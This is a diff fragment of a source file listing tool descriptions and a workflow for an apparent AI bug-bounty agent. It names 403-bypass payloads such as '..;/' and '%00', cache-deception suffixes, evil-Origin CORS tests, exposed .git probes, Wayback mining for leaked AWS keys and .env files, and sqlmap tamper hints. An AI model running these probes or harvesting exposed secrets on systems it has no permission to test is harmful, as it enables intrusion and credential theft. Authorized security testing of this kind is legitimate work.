 	"- bb_js_secrets(domain, limit?) — mine archived JS bundles from the Wayback CDX API for leaked secrets (AWS keys, Google API keys, JWTs, generic key/secret pairs).",
 	"- bb_403_bypass(url) — try HTTP method flips, routing headers (X-Original-URL, X-Forwarded-For, X-Real-IP) and path mutations (/./, /%2e/, ;, %00, ..;/ etc) against a 403.",
@@ -3006,6 +3317,9 @@ const GUIDANCE = [
 	"- bb_cache_deception_scan(domain, limit?) — mine archived account/dashboard URLs and test static-extension suffixes (;.css, /style.css, .png) for cache poisoning/deception.",
 	"- bb_sqli_param_hunt(domain, limit?) — correlate Wayback + OTX URLs to rank dynamic endpoints and injection-prone parameter names for SQLi testing.",
 	"- bb_waf_fingerprint(url) — fingerprint WAF/CDN from headers (Cloudflare, Akamai, Imperva, AWS, F5, Azure, Sucuri) and suggest sqlmap --tamper hints.",
+	"- bb_cors_scan(url) — test cross-origin resource sharing: send evil/null Origins + OPTIONS preflight, detect reflected ACAO, ACAC true, wildcard+credentials and missing Vary: Origin.",
+	"- bb_git_exposure(url) — probe for exposed .git: /.git/HEAD, /.git/config, /.git/index, /.git/logs/HEAD, /.git/refs/heads/main plus directory-listing check.",
+	"- bb_sensitive_files(domain, limit?) — mine Wayback CDX for sensitive-file extensions (.env, .sql, .bak, .xls, .pem, .gitignore, .tar.gz, ...) grouped by type.",
 	"- bb_source_audit(language?) — SEGREGATED source-code audit methodology (C/C++, Rust, Go, JS/TS): 7-step audit flow, bug-class priority order (parsers, memory mgmt, IPC/network, privilege boundaries, error handling, concurrency), per-language checks + grep patterns (memcpy, unsafe, unwrap, unsafe.Pointer, eval, __proto__, ...). Pass a language slug for focused output.",
 	"- bb_triage() — Rhat-scored bug triage workflow (bughunt obsidian bug-report template): score candidates with P(real_bug)/P(feasible)/P(reproducible)/P(new_root_cause)/expected_impact -> REPORT / INVESTIGATE / DISCARD; status tracking, finding classes (genuine vs design opinion vs style), SQLite concurrency audit checklist, report template fields.",
 	"Workflow: start a target with bb_recon(domain); drill into promising live hosts with bb_security_headers / bb_tech_detect / bb_probe_http; mine bb_wayback_urls for archived endpoints, IDs and params; use web_search for current techniques and bash for active PoCs. All sources are keyless and rate-limited — expect per-source errors and fall back gracefully. Triage every candidate with bb_triage BEFORE reporting (REPORT only high-Rhat: genuine + feasible + reproducible).",
